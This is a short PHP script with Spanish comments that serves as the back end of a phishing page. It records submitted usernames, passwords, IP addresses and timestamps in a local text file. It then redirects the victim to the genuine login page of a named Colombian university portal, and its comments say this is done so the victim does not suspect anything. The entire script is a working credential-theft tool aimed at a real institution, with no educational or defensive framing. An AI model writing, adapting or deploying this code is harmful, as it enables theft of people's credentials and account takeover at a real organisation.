<?php
// Verificamos si los datos llegaron por método POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = $_POST['usuario'];
    $clave = $_POST['clave'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $fecha = date("Y-m-d H:i:s");

    // Guardamos las credenciales capturadas en un archivo de texto local (credenciales.txt)
    $registro = "Fecha: $fecha | IP: $ip | Usuario: $usuario | Clave: $clave\n";
    file_put_contents("credenciales.txt", $registro, FILE_APPEND);

    // Redirección trampa: Mandamos a la víctima al sitio real para que no sospeche
    header("Location: https://sigedin.uniputumayo.edu.co/login");
    exit();
}
?>